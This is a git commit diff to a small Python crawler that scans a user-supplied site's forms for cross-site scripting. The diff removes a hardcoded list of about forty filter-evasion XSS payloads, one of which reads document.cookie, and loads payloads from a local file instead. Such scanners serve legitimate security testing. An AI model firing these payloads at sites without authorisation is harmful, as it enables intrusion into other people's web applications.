9871759e558acc0b9dadd5a45b16547389bd4d02
unknown <gsumitg673@gmail.com>
2022-04-01 11:37:11 +0530

    reading all payloads/sorting /running line by line

--- new code.py
+++ new code.py
@@ -76,6 +76,8 @@ def scan_xss(u, js_script):
             print(f"[*] Form details:")
             pprint(form_details)
             is_vulnerable = True
+            if is_vulnerable:
+                break
             # won't break because we want to print available vulnerable forms
     return is_vulnerable
 
@@ -83,7 +85,7 @@ url=input("ENTER THE url: ")
 g=webCrawler(url, 0)
 if __name__ == "__main__":
     a = []
-    g.crawl(url, 1000, a)
+    g.crawl(url, 30, a)
     print("[+] Total Internal links:", len(g.internal_urls))
     print("[+] Total External links:", len(g.external_urls))
     print("[+] Total URLs:", len(g.external_urls) + len(g.internal_urls))
@@ -92,45 +94,9 @@ if __name__ == "__main__":
     
 
     
-    payloads = ['<script\x20type="text/javascript">javascript:alert(1);</script>', 
-    '<script\x3Etype="text/javascript">javascript:alert(1);</script>', 
-    '<script\x0Dtype="text/javascript">javascript:alert(1);</script>', 
-    '<script\x09type="text/javascript">javascript:alert(1);</script>', 
-    '<script\x0Ctype="text/javascript">javascript:alert(1);</script>', 
-    '<script\x2Ftype="text/javascript">javascript:alert(1);</script>', 
-    '<script\x0Atype="text/javascript">javascript:alert(1);</script>',
-    """'`"><\x3Cscript>javascript:alert(1)</script>""",
-    """'`"><\x00script>javascript:alert(1)</script>""" 
-    '''"'>-->*/</noscript></ti tle><script>alert()</script>''',
-    '<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">', 
-    '<details open ontoggle="alert()">', 
-    '\<a onmouseover="alert(document.cookie)"\>xxs link\</a\>', 
-    '<iframe srcdoc="<svg onload=alert(4);>">', 
-    '<img src=1 href=1 onerror="javascript:alert(1)"></img>', 
-    '<audio src=1 href=1 onerror="javascript:alert(1)"></audio>', 
-    '<video src=1 href=1 onerror="javascript:alert(1)"></video>', 
-    '<body src=1 href=1 onerror="javascript:alert(1)"></body>', 
-    '<image src=1 href=1 onerror="javascript:alert(1)"></image>', 
-    '<object src=1 href=1 onerror="javascript:alert(1)"></object>', 
-    '<script src=1 href=1 onerror="javascript:alert(1)"></script>', 
-    '<svg onResize svg onResize="javascript:javascript:alert(1)"></svg onResize>', 
-    '<title onPropertyChange title onPropertyChange="javascript:javascript:alert(1)"></title onPropertyChange>', 
-    '<iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad>', 
-    '<body onMouseEnter body onMouseEnter="javascript:javascript:alert(1)"></body onMouseEnter>', 
-    '<body onFocus body onFocus="javascript:javascript:alert(1)"></body onFocus>',
-    '<frameset onScroll frameset onScroll="javascript:javascript:alert(1)"></frameset onScroll>', 
-    '<script onReadyStateChange script onReadyStateChange="javascript:javascript:alert(1)"></script onReadyStateChange>', 
-    '<html onMouseUp html onMouseUp="javascript:javascript:alert(1)"></html onMouseUp>', 
-    '<body onPropertyChange body onPropertyChange="javascript:javascript:alert(1)"></body onPropertyChange>', 
-    '<svg onLoad svg onLoad="javascript:javascript:alert(1)"></svg onLoad>', 
-    '<body onPageHide body onPageHide="javascript:javascript:alert(1)"></body onPageHide>', 
-    '<body onMouseOver body onMouseOver="javascript:javascript:alert(1)"></body onMouseOver>', 
-    '<body onUnload body onUnload="javascript:javascript:alert(1)"></body onUnload>', 
-    '<body onLoad body onLoad="javascript:javascript:alert(1)"></body onLoad>', 
-    '<bgsound onPropertyChange bgsound onPropertyChange="javascript:javascript:alert(1)"></bgsound onPropertyChange>', 
-    '<html onMouseLeave html onMouseLeave="javascript:javascript:alert(1)"></html onMouseLeave>', 
-    '<html onMouseWheel html onMouseWheel="javascript:javascript:alert(1)"></html onMouseWheel>', 
-    '<style onLoad style onLoad="javascript:javascript:alert(1)"></style onLoad>' ]
+    payloads = open('C:\\Users\Sumit\Downloads\payloads.txt', 'r', encoding='utf8')
+    lines = sorted(payloads.read().split("\n"), key=len)
+
 
 
 # initializing string 
@@ -154,7 +120,7 @@ if __name__ == "__main__":
 # print("The list after removal : " + str(res))
 for url in a:
     with ThreadPoolExecutor() as executer:
-        result = executer.map(scan_xss, repeat(url), payloads)
+        result = executer.map(scan_xss, repeat(url), lines)
         print([x for x in result])
 
 
